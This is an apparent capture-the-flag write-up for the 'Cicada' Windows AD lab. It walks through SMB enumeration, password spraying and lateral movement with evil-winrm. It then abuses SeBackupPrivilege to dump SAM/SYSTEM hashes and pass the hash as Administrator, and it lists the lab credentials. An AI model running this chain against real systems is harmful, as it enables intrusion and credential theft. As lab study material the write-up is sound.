# Cicada \[Windows AD Easy]

## Report

An SMB share reveals a default password that when enumerated using lookupsid.py shows a user 'michael.wrightson'. This user has access to rpcclient where credentials for another user 'david.orelious'. This user has access to an SMB share 'Dev' where credentials for 'emily.oscars' are found.

This user has Winrm access and has the SebackupPrivelege which is used to retrieve hashes for admin.

## Cheatsheet

```
10.10.11.35

./lookupsid.py guest@10.10.11.35 -no-pass
nxc smb 10.10.11.35 -u userlist.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'

rpcclient -U 'michael.wrightson'  10.10.11.35

smbclient --user david.orelious //10.10.11.35/DEV

evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
whoami /privs /groups
SeBackupPrivilege
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

cd Temp
download sam
download system
pypykatz registry --sam sam system
evil-winrm -i cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'

```

## Loot

### Creds

```
Cicada$M6Corpb*@Lp#nZp!8 : Common password from SMB
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
david.orelious:aRt$Lp#7t*VQ!3
emily.oscars:Q!3@Lp#M6b*7t*Vt [SMB/DEV]

```

### Proof

Backup Privelege - User bypasses all UAC to read and backup files, this privelege is abused to recover the SAM and SYSTEM registry files which has NTLM hashes of all users.
